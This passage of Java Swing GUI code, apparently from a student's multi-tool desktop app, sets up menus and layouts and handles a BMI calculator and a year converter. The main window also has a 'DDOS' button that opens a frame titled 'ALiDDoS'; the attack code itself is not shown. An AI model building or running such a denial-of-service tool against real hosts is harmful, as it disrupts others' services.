                    .addGroup(plusLayout.createSequentialGroup()
                        .addGap(4, 4, 4)
                        .addComponent(jButton4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(plusType, javax.swing.GroupLayout.DEFAULT_SIZE, 45, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton6)
                        .addGap(7, 7, 7)
                        .addComponent(jButton7))
                    .addComponent(jScrollPane8))
                .addGap(34, 34, 34)
                .addComponent(culc, javax.swing.GroupLayout.PREFERRED_SIZE, 38, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 45, Short.MAX_VALUE)
                .addGroup(plusLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(resultNameFont, javax.swing.GroupLayout.PREFERRED_SIZE, 58, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(ResultA, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(26, 26, 26)
                .addComponent(leftB, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        getHTML.setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        getHTML.setBackground(new java.awt.Color(204, 255, 0));
        getHTML.setMinimumSize(new java.awt.Dimension(600, 600));
        getHTML.setPreferredSize(new java.awt.Dimension(600, 600));
        getHTML.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                getHTMLformKeyReleased(evt);
            }
        });

        Console1.setColumns(20);
        Console1.setRows(5);
        Console1.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                Console1KeyReleased(evt);
            }
        });
        jScrollPane9.setViewportView(Console1);

        UrlArea.setColumns(20);
        UrlArea.setRows(5);
        UrlArea.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                UrlAreaKeyReleased(evt);
            }
        });
        jScrollPane10.setViewportView(UrlArea);

        PressSure.setForeground(new java.awt.Color(255, 0, 204));
        PressSure.setText("確定(Ctrl+Q)");
        PressSure.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PressSureActionPerformed(evt);
            }
        });

        PressClear.setForeground(new java.awt.Color(255, 0, 204));
        PressClear.setText("清除(Alt+Shift+C)");
        PressClear.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PressClearActionPerformed(evt);
            }
        });

        uiMenuBar.setForeground(new java.awt.Color(255, 0, 0));
        uiMenuBar.setAlignmentY(2.0F);
        uiMenuBar.setFont(new java.awt.Font("Microsoft JhengHei UI", 0, 14)); // NOI18N
        uiMenuBar.setPreferredSize(new java.awt.Dimension(58, 25));

        file.setForeground(new java.awt.Color(0, 255, 51));
        file.setText("檔案");

        save1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.CTRL_MASK));
        save1.setText("儲存");
        save1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                save1ActionPerformed(evt);
            }
        });
        file.add(save1);

        open1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_O, java.awt.event.InputEvent.CTRL_MASK));
        open1.setText("打開");
        open1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                open1ActionPerformed(evt);
            }
        });
        file.add(open1);

        left.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F4, java.awt.event.InputEvent.ALT_MASK));
        left.setText("離開");
        left.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                leftActionPerformed(evt);
            }
        });
        file.add(left);

        uiMenuBar.add(file);

        editMenu.setForeground(new java.awt.Color(0, 255, 0));
        editMenu.setText("編輯");

        Copy.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.CTRL_MASK));
        Copy.setText("複製");
        editMenu.add(Copy);

        Paste.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_V, java.awt.event.InputEvent.CTRL_MASK));
        Paste.setText("貼上");
        Paste.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PasteActionPerformed(evt);
            }
        });
        editMenu.add(Paste);

        Cut.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_X, java.awt.event.InputEvent.CTRL_MASK));
        Cut.setText("剪下");
        Cut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CutActionPerformed(evt);
            }
        });
        editMenu.add(Cut);

        Clear.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_C, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.SHIFT_MASK));
        Clear.setText("清除");
        Clear.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ClearActionPerformed(evt);
            }
        });
        editMenu.add(Clear);

        Sure1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_Q, java.awt.event.InputEvent.CTRL_MASK));
        Sure1.setText("確定");
        Sure1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                Sure1ActionPerformed(evt);
            }
        });
        editMenu.add(Sure1);

        uiMenuBar.add(editMenu);

        Windows.setForeground(new java.awt.Color(0, 255, 0));
        Windows.setText("視窗");

        preferenceMenu.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        preferenceMenu.setText("偏好設定");
        preferenceMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                preferenceMenuActionPerformed(evt);
            }
        });
        Windows.add(preferenceMenu);

        uiMenuBar.add(Windows);

        Help.setForeground(new java.awt.Color(0, 255, 0));
        Help.setText("幫助");

        doc.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_D, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        doc.setText("文檔");
        Help.add(doc);

        netSupport.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        netSupport.setText("網路文件與支持");
        Help.add(netSupport);

        keyWords.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_K, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        keyWords.setText("快捷鍵");
        Help.add(keyWords);

        report.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_R, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        report.setText("回報");
        Help.add(report);

        HTMLdoc.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_H, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        HTMLdoc.setText("HTML幫助文件");
        Help.add(HTMLdoc);

        about1.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_A, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        about1.setText("關於");
        about1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                about1ActionPerformed(evt);
            }
        });
        Help.add(about1);

        uiMenuBar.add(Help);

        jMenu7.setForeground(new java.awt.Color(0, 255, 0));
        jMenu7.setText("更多");

        plusMenu.setText("加減乘除");
        plusMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                plusMenuActionPerformed(evt);
            }
        });
        jMenu7.add(plusMenu);

        uiMenuBar.add(jMenu7);

        getHTML.setJMenuBar(uiMenuBar);

        javax.swing.GroupLayout getHTMLLayout = new javax.swing.GroupLayout(getHTML.getContentPane());
        getHTML.getContentPane().setLayout(getHTMLLayout);
        getHTMLLayout.setHorizontalGroup(
            getHTMLLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane9)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, getHTMLLayout.createSequentialGroup()
                .addContainerGap(112, Short.MAX_VALUE)
                .addGroup(getHTMLLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(getHTMLLayout.createSequentialGroup()
                        .addComponent(PressSure)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(PressClear))
                    .addComponent(jScrollPane10, javax.swing.GroupLayout.PREFERRED_SIZE, 393, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(95, 95, 95))
        );
        getHTMLLayout.setVerticalGroup(
            getHTMLLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(getHTMLLayout.createSequentialGroup()
                .addComponent(jScrollPane9, javax.swing.GroupLayout.PREFERRED_SIZE, 385, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane10, javax.swing.GroupLayout.PREFERRED_SIZE, 51, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(getHTMLLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(PressSure, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(PressClear, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap(84, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout ThanksForUsingLayout = new javax.swing.GroupLayout(ThanksForUsing.getContentPane());
        ThanksForUsing.getContentPane().setLayout(ThanksForUsingLayout);
        ThanksForUsingLayout.setHorizontalGroup(
            ThanksForUsingLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );
        ThanksForUsingLayout.setVerticalGroup(
            ThanksForUsingLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );

        MainAboutFrame.setMinimumSize(new java.awt.Dimension(300, 420));
        MainAboutFrame.setPreferredSize(new java.awt.Dimension(300, 420));

        jTextArea3.setColumns(20);
        jTextArea3.setRows(5);
        jTextArea3.setText("(C)愛神閃靈團隊 2020\n(C)夏特稀 2020/2/17\n\n夏特稀工程用工具\n目前版本:V1.2\n\n如果喜歡我的工具的話呢 開放合作喔喔喔喔\n有些工具在國一時就做了 最近翻到拿來更新\n我將一些工具拿來整合,整理 希望大家會喜歡\n\nHope You will Like it");
        jScrollPane11.setViewportView(jTextArea3);

        jButton1.setFont(new java.awt.Font("新細明體", 0, 36)); // NOI18N
        jButton1.setForeground(new java.awt.Color(255, 102, 0));
        jButton1.setText("確定");
        jButton1.setMinimumSize(new java.awt.Dimension(105, 53));
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout MainAboutFrameLayout = new javax.swing.GroupLayout(MainAboutFrame.getContentPane());
        MainAboutFrame.getContentPane().setLayout(MainAboutFrameLayout);
        MainAboutFrameLayout.setHorizontalGroup(
            MainAboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane11, javax.swing.GroupLayout.DEFAULT_SIZE, 300, Short.MAX_VALUE)
            .addComponent(jButton1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        MainAboutFrameLayout.setVerticalGroup(
            MainAboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(MainAboutFrameLayout.createSequentialGroup()
                .addComponent(jScrollPane11, javax.swing.GroupLayout.PREFERRED_SIZE, 319, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        InstallFrame.setMinimumSize(new java.awt.Dimension(400, 300));

        installPath.setColumns(20);
        installPath.setRows(5);
        jScrollPane12.setViewportView(installPath);

        jLabel10.setFont(new java.awt.Font("新細明體", 0, 48)); // NOI18N
        jLabel10.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel10.setText("請放入程式位置");

        jButton8.setFont(new java.awt.Font("新細明體", 1, 24)); // NOI18N
        jButton8.setForeground(new java.awt.Color(102, 255, 0));
        jButton8.setText("安裝");
        jButton8.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton8ActionPerformed(evt);
            }
        });

        installError.setEditable(false);
        installError.setColumns(20);
        installError.setFont(new java.awt.Font("Monospaced", 0, 24)); // NOI18N
        installError.setRows(5);
        jScrollPane13.setViewportView(installError);

        javax.swing.GroupLayout InstallFrameLayout = new javax.swing.GroupLayout(InstallFrame.getContentPane());
        InstallFrame.getContentPane().setLayout(InstallFrameLayout);
        InstallFrameLayout.setHorizontalGroup(
            InstallFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane12)
            .addComponent(jLabel10, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
            .addGroup(InstallFrameLayout.createSequentialGroup()
                .addGap(31, 31, 31)
                .addComponent(jButton8, javax.swing.GroupLayout.PREFERRED_SIZE, 349, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(20, Short.MAX_VALUE))
            .addComponent(jScrollPane13)
        );
        InstallFrameLayout.setVerticalGroup(
            InstallFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(InstallFrameLayout.createSequentialGroup()
                .addComponent(jLabel10, javax.swing.GroupLayout.PREFERRED_SIZE, 48, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane12, javax.swing.GroupLayout.PREFERRED_SIZE, 63, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane13, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jButton8, javax.swing.GroupLayout.DEFAULT_SIZE, 97, Short.MAX_VALUE)
                .addContainerGap())
        );

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setBackground(new java.awt.Color(255, 0, 204));
        setMinimumSize(new java.awt.Dimension(500, 600));

        ChineseButton.setText("天干地支");
        ChineseButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ChineseButtonActionPerformed(evt);
            }
        });

        Bmi.setText("BMI計算機");
        Bmi.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BmiActionPerformed(evt);
            }
        });

        Painter.setText("小畫家");
        Painter.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                PainterActionPerformed(evt);
            }
        });

        Culc.setText("小型機算機");
        Culc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CulcActionPerformed(evt);
            }
        });

        DDOSButton.setText("DDOS");
        DDOSButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                DDOSButtonActionPerformed(evt);
            }
        });

        htmlFrame.setText("得到網頁HTML");
        htmlFrame.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                htmlFrameActionPerformed(evt);
            }
        });

        MC.setText("玩Minecraft");
        MC.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                MCActionPerformed(evt);
            }
        });

        MC1.setText("安裝程式");
        MC1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                MC1ActionPerformed(evt);
            }
        });

        jMenu1.setText("檔案");

        jMenuItem5.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F4, java.awt.event.InputEvent.ALT_MASK));
        jMenuItem5.setText("離開");
        jMenuItem5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem5ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem5);

        jMenuBar1.add(jMenu1);

        jMenu8.setText("更多");

        MainAbout.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_A, java.awt.event.InputEvent.SHIFT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        MainAbout.setText("關於");
        MainAbout.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                MainAboutActionPerformed(evt);
            }
        });
        jMenu8.add(MainAbout);

        jMenuBar1.add(jMenu8);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(MC, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(ChineseButton, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(Bmi, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 129, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(DDOSButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(Culc, javax.swing.GroupLayout.DEFAULT_SIZE, 129, Short.MAX_VALUE)
                    .addComponent(MC1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(Painter, javax.swing.GroupLayout.DEFAULT_SIZE, 129, Short.MAX_VALUE)
                    .addComponent(htmlFrame, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(Bmi, javax.swing.GroupLayout.DEFAULT_SIZE, 45, Short.MAX_VALUE)
                    .addComponent(Culc, javax.swing.GroupLayout.DEFAULT_SIZE, 45, Short.MAX_VALUE)
                    .addComponent(Painter, javax.swing.GroupLayout.DEFAULT_SIZE, 45, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(ChineseButton, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(DDOSButton, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(htmlFrame, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(MC, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(MC1, javax.swing.GroupLayout.PREFERRED_SIZE, 45, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(434, 434, 434))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void BmiActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_BmiActionPerformed
        BMIculc.setLocationRelativeTo(null);
        BMIculc.setVisible(true);
        BMIculc.setTitle("BMI計算機");
        BMIculc.setIconImage(IMG.getImage());
    }//GEN-LAST:event_BmiActionPerformed

    private void PainterActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PainterActionPerformed
        new Painter();
    }//GEN-LAST:event_PainterActionPerformed

    private void CulcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_CulcActionPerformed
        new Culc();
    }//GEN-LAST:event_CulcActionPerformed

    private void DDOSButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_DDOSButtonActionPerformed
        DDOSFrame.setLocationRelativeTo(null);
        DDOSFrame.setVisible(true);
        CancelButton.setVisible(false);
        DDOSFrame.setIconImage(IMG.getImage());
        
        DDOSFrame.setTitle("ALiDDoS By 夏特稀");
        DDOSFrame.setBackground(Color.RED);
    }//GEN-LAST:event_DDOSButtonActionPerformed

    private void htmlFrameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_htmlFrameActionPerformed
        getHTML.setLocationRelativeTo(null);
        getHTML.setVisible(true);
        getHTML.setIconImage(IMG.getImage());
        switch (language) {
            case "zh_ROC":
                getHTML.setTitle("得到網頁HTML");
                break;
            case "zh_PRC":
                getHTML.setTitle("得到网页HTML");
            case "en_US":
                getHTML.setTitle("Web HTMLを取得");
        }
        getHTML.getContentPane().setBackground(new Color (0,255,255));
        plus.getContentPane().setBackground(Color.yellow);
        preference.getContentPane().setBackground(Color.WHITE);
    }//GEN-LAST:event_htmlFrameActionPerformed

    private void HightActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_HightActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_HightActionPerformed

    private void WeightActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_WeightActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_WeightActionPerformed

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        double bmiV = Double.parseDouble(Weight.getText()) / Math.pow(Double.parseDouble(Hight.getText()) / 100, 2);
        String bmiVa = String.format("%.3f", bmiV);
        if (bmiV >= 35) {
            BMIval.setText(bmiVa + "\t重度肥胖");
        } else if (bmiV >= 35) {
            BMIval.setText(bmiVa + "\t重度肥胖");
        } else if (bmiV >= 30) {
            BMIval.setText(bmiVa + "\t中度肥胖");
        } else if (bmiV >= 27) {
            BMIval.setText(bmiVa + "\t輕度肥胖");
        } else if (bmiV >= 24) {
            BMIval.setText(bmiVa + "\t過重");
        } else if (bmiV >= 18.5) {
            BMIval.setText(bmiVa + "\t正常");
        } else if (bmiV < 18.5) {
            BMIval.setText(bmiVa + "\t過輕");
        }

    }//GEN-LAST:event_jButton2ActionPerformed

    private void BMIvalActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_BMIvalActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_BMIvalActionPerformed

    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
        BMIculc.setVisible(false);
    }//GEN-LAST:event_jButton3ActionPerformed

    private void ChineseButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ChineseButtonActionPerformed
        ChineseYearFrame.setLocationRelativeTo(null);
        ChineseYearFrame.setVisible(true);
        ChineseYearFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_ChineseButtonActionPerformed

    private void ConvertActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ConvertActionPerformed
        boolean XiYearBool = true;
        boolean MingYearBool = true;
        if (te.getText().equals("")) {
            XiYearBool = false;
        }
        if (XiYearBool == true) {
            try {
                int XigetInt = Integer.parseInt(te.getText());
                String MingGuo = Integer.toString(XigetInt - 1911);
                roc.setText(MingGuo);
                int Xiyear = Integer.parseInt(te.getText());
                Year Xiyr = new Year();
                Xiyr.culc(Xiyear);
                if (Year.Language == "Chinese") {
                    la.setText("中華民國" + te.getText() + t1 + Xiyr.FTian + Xiyr.FDi + this.t2);
                } else if (Year.Language == "English") {
                    la.setText("the ROC in " + te.getText() + t1 + Xiyr.FTian + "-" + Xiyr.FDi + this.t2);
                }
                te.setText(null);
            } catch (NumberFormatException h) {
                la.setText("請輸入數值!! ok?");
            }
        }
        if (roc.getText().equals("")) {
            MingYearBool = false;
        }
        if (MingYearBool == true) {
            try {
                int f = Integer.parseInt(roc.getText());
                String g = Integer.toString(f + 1911);
                te.setText(g);
                int year = Integer.parseInt(roc.getText()) + 1911;;
                Year yar = new Year();
                yar.culc(year);
                if (yar.Language == "Chinese") {
                    la.setText("中華民國" + roc.getText() + t1 + yar.FTian + yar.FDi + this.t2);
                } else if (yar.Language == "English") {
                    la.setText("the ROC in " + roc.getText() + t1 + yar.FTian + "-" + yar.FDi + this.t2);
                }
                roc.setText(null);
            } catch (NumberFormatException e) {
                la.setText("請輸入數值!! ok?");
            }
        }
    }//GEN-LAST:event_ConvertActionPerformed

    private void openActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_openActionPerformed
        JFrame saveFile = new JFrame("打開檔案");
        saveFile.setLayout(new FlowLayout());
//        saveFile.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JButton chooseFile = new JButton("選擇檔案");
        chooseFile.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent ae) {
                JFileChooser fileChooser = new JFileChooser();//宣告filechooser
                int returnValue = fileChooser.showOpenDialog(null);//叫出filechooser
                if (returnValue == JFileChooser.APPROVE_OPTION) //判斷是否選擇檔案
                {
                    File selectedFile = fileChooser.getSelectedFile();//指派給File
                    System.out.println(selectedFile.getName()); //印出檔名
                }
            }
        }
        );
        saveFile.add(chooseFile);
        saveFile.pack();
        saveFile.setVisible(true);
    }//GEN-LAST:event_openActionPerformed

    private void saveActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_saveActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_saveActionPerformed

    private void exitActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitActionPerformed
        System.exit(0);
    }//GEN-LAST:event_exitActionPerformed

    private void cpActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_cpActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_cpActionPerformed

    private void preActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_preActionPerformed
        preFrame.setVisible(true);
        preFrame.setLocationRelativeTo(null);
        preFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_preActionPerformed

    private void aboutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_aboutActionPerformed
        aboutFrame.setVisible(true);
        aboutFrame.setLocationRelativeTo(null);
        aboutFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_aboutActionPerformed

    private void CloseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_CloseActionPerformed
        aboutFrame.setVisible(false);
    }//GEN-LAST:event_CloseActionPerformed

    private void LanguageActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_LanguageActionPerformed
        LanguageForm.setVisible(true);
        LanguageForm.setLocationRelativeTo(null);
        LanguageForm.setIconImage(IMG.getImage());
    }//GEN-LAST:event_LanguageActionPerformed

